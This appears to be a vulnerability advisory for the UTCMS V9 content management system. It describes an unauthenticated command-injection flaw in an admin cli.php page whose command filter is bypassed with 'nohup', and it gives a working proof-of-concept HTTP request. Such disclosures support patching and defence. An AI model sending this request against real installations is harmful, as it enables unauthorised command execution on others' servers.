# Vendor

HuangDou

# Product

UTCMS

# version

 V9

# Download 

https://gitee.com/usualtool/ut-cms

# Vulnerability

RCE

# Description

The cli.php page can execute system commands without authentication. Although filtering exists, it is not strict.

# Analysis

1. The app/modules/ut-cac/admin/cli.php page can be accessed directly, and there is no authentication for this page.
<img width="1599" alt="image" src="https://github.com/user-attachments/assets/94deb22d-af2a-422e-9076-8dcb833463a9">

2. The filtering rules stipulate that commands can only start with cd, php, nohup, or composer. However, system commands can be executed using "nohup whoami".
<img width="939" alt="image" src="https://github.com/user-attachments/assets/e1b1ca58-8092-426a-950d-ed528d9b8abf">

# POC
```
POST /app/modules/ut-cac/admin/cli.php HTTP/1.1
Host: 192.168.17.24
Content-Length: 16
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Origin: http://192.168.17.24
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

o=nohup ifconfig
```
